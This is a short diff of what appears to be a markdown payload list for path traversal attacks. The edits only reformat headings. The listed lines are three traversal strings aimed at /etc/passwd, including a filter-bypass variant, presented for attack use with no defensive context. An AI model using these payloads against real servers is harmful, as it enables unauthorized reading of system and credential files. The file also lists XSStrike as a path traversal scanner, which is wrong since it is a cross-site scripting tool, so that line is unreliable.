@@ -1,11 +1,11 @@
-Path Traversal Attack Payload List
+# Path Traversal Attack Payload List:
 
 
-Path Traversal Attack Scanner Tools:
+# Path Traversal Attack Scanner Tools:
 . XSStrike
 
 
-# Payload List
+# Payload List :
 ../../../etc/passwd
 /etc/passwd
 ....//....//....//etc/passwd
